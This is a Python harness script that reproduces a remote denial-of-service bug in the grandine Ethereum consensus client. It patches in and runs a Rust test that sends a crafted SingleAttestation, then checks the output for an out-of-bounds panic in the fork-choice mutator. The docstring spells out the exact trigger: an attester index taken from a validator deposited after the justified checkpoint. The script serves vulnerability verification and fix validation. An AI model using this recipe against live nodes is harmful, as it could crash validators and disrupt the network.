"""Deterministic, in-process reproduction of CHK-QW-02 (grandine).

Unlike the libp2p probe (``grandine_singleattestation_attack.py``), this probe
does NOT need a live devnet, a deposit on a real chain, or gossip-mesh timing.
It drives grandine's own fork-choice test harness (``fork_choice_control``) so
the malicious ``SingleAttestation`` is delivered exactly as a remote gossip peer
would, and the ``store-mutator`` thread panics at
``fork_choice_store::store::Store::justified_active_balance`` -- the finding's
``justified_active_balances[attester_index]`` out-of-bounds access.

Why the original libp2p PoC could never panic
----------------------------------------------
The old payload used ``attester_index = 0xFFFFFFFF`` with a zeroed signature and
assumed "grandine validates the BLS signature *after* the fork-choice mutator
indexes justified_active_balances". That is false: the singular path verifies the
signature (``validate_constructed_indexed_attestation`` ->
``public_key(state, attester_index)?``) *before* the mutator, so a non-existent
index is rejected at the pubkey lookup and never reaches the panic.

The correct precondition (encoded by the Rust test this probe installs):
``attester_index`` must be a real validator that is present in the target-state
registry (valid pubkey + attacker-held key, so the signature verifies) but beyond
the justified-state registry length. That is a validator deposited *after* the
justified checkpoint -- ``index in [justified_len, target_len)``. The Electra
singular path never checks committee membership, so such an attestation reaches
the mutator and indexes ``justified_active_balances[index]`` out of bounds.

Obligations proven
------------------
- (3) baseline symptom: stock grandine panics the mutator (remote DoS).
- (2) causation: applying ``guard.diff`` (bounds-guarded justified access) makes
  the mutator process the attestation as zero-weight -- the ``#[should_panic]``
  test then fails, i.e. the guard removes exactly the panic.

Usage
-----
    python -m harness.probes.grandine_singleattestation_gap_index \
        --grandine-dir /path/to/grandine

Requirements: a full grandine checkout (with the ``consensus-spec-tests``
submodule for the untouched test target) and ``libclang`` for the reth-mdbx
bindgen build. Both are auto-handled below when possible.
"""

from __future__ import annotations

import argparse
import glob
import json
import os
import re
import subprocess
import sys
from dataclasses import dataclass, asdict
from pathlib import Path

TEST_PATH = (
    "chk_qw_02::singleattestation_oob_attester_index_reaches_unguarded_justified_balance"
)
MEASURE_PATH = "chk_qw_02::measure_deposit_registry_growth_in_electra"
PATCH_NAME = "grandine_singleattestation_gap_index.patch"
OOB_PANIC_RE = re.compile(r"index out of bounds: the len is (\d+) but the index is (\d+)")


@dataclass
class ReproResult:
    reproduced: bool
    test: str
    oob_len: int | None
    oob_index: int | None
    mutator_thread_panicked: bool
    stdout_tail: str
    note: str

    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2)


def _detect_libclang() -> str | None:
    if os.environ.get("LIBCLANG_PATH"):
        return os.environ["LIBCLANG_PATH"]
    for pattern in (
        "/nix/store/*clang*-lib/lib/libclang.so*",
        "/usr/lib/llvm-*/lib/libclang.so*",
        "/usr/lib/x86_64-linux-gnu/libclang*.so*",
    ):
        hits = sorted(glob.glob(pattern))
        if hits:
            return str(Path(hits[0]).parent)
    return None


def _patch_applies(grandine_dir: Path, patch: Path) -> bool:
    """True if the patch is not yet applied (i.e. `git apply --check` succeeds)."""
    r = subprocess.run(
        ["git", "apply", "--check", str(patch)],
        cwd=grandine_dir,
        capture_output=True,
        text=True,
    )
    return r.returncode == 0


def _already_applied(grandine_dir: Path) -> bool:
    marker = grandine_dir / "fork_choice_control" / "src" / "extra_tests.rs"
    return marker.exists() and "mod chk_qw_02" in marker.read_text(encoding="utf-8")


def ensure_repro_installed(grandine_dir: Path) -> None:
    patch = Path(__file__).with_name(PATCH_NAME)
    if _already_applied(grandine_dir):
        return
    if not _patch_applies(grandine_dir, patch):
        raise RuntimeError(
            f"{PATCH_NAME} does not apply cleanly to {grandine_dir} and the "
            "reproduction is not already present; the grandine checkout may be at "
            "an unexpected revision."
        )
    subprocess.run(["git", "apply", str(patch)], cwd=grandine_dir, check=True)


def _neutralize_spec_tests_if_needed(grandine_dir: Path) -> tuple[Path, str] | None:
    """The untouched `spec_tests` module needs the consensus-spec-tests submodule
    to compile (its `#[test_resources]` globs panic at compile time otherwise).
    When that submodule is absent, temporarily disable the module so the rest of
    the `fork_choice_control` test target -- including this reproduction -- can
    build. Returns (lib_rs_path, original_text) so the caller can restore it."""
    if (grandine_dir / "consensus-spec-tests" / "tests").is_dir():
        return None
    lib_rs = grandine_dir / "fork_choice_control" / "src" / "lib.rs"
    original = lib_rs.read_text(encoding="utf-8")
    patched = re.sub(
        r"^#\[cfg\(test\)\]\nmod spec_tests;",
        "// [chk-qw-02] spec_tests disabled: consensus-spec-tests submodule absent\n"
        "// mod spec_tests;",
        original,
        count=1,
        flags=re.MULTILINE,
    )
    if patched != original:
        lib_rs.write_text(patched, encoding="utf-8")
        return lib_rs, original
    return None


def run_gap_index_repro(grandine_dir: str | Path = "grandine") -> ReproResult:
    grandine_path = Path(grandine_dir).resolve()
    if not (grandine_path / "fork_choice_control").is_dir():
        raise FileNotFoundError(f"not a grandine checkout: {grandine_path}")

    ensure_repro_installed(grandine_path)
    restore = _neutralize_spec_tests_if_needed(grandine_path)

    env = dict(os.environ)
    libclang = _detect_libclang()
    if libclang:
        env["LIBCLANG_PATH"] = libclang

    cmd = [
        "cargo", "test", "-p", "fork_choice_control", "--features", "blst",
        TEST_PATH, "--", "--nocapture", "--test-threads=1",
    ]
    try:
        proc = subprocess.run(
            cmd, cwd=grandine_path, env=env, capture_output=True, text=True
        )
    finally:
        if restore is not None:
            restore[0].write_text(restore[1], encoding="utf-8")

    combined = proc.stdout + "\n" + proc.stderr
    mutator_panicked = "thread 'store-mutator'" in combined and "panicked" in combined
    m = OOB_PANIC_RE.search(combined)
    oob_len = int(m.group(1)) if m else None
    oob_index = int(m.group(2)) if m else None
    # `#[should_panic]` makes a green test the signal that the OOB panic fired.
    passed = "test result: ok." in combined and "1 passed" in combined
    reproduced = passed and mutator_panicked and oob_index is not None

    note = (
        "CONFIRMED: gossip SingleAttestation with a post-justified-checkpoint "
        "attester_index reaches the fork-choice mutator and indexes "
        "justified_active_balances out of bounds (remote DoS)."
        if reproduced
        else "NOT reproduced -- see stdout_tail (guard may be applied, or the "
        "grandine revision/build differs)."
    )
    tail = "\n".join(combined.strip().splitlines()[-40:])
    return ReproResult(
        reproduced=reproduced,
        test=TEST_PATH,
        oob_len=oob_len,
        oob_index=oob_index,
        mutator_thread_panicked=mutator_panicked,
        stdout_tail=tail,
        note=note,
    )


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--grandine-dir", default="grandine")
    parser.add_argument("--json", action="store_true", help="emit JSON only")
    args = parser.parse_args(argv)

    result = run_gap_index_repro(args.grandine_dir)
    if args.json:
        print(result.to_json())
    else:
        print(result.to_json())
        print(
            "\n[CHK-QW-02] reproduced"
            if result.reproduced
            else "\n[CHK-QW-02] NOT reproduced"
        )
    return 0 if result.reproduced else 1


if __name__ == "__main__":
    sys.exit(main())
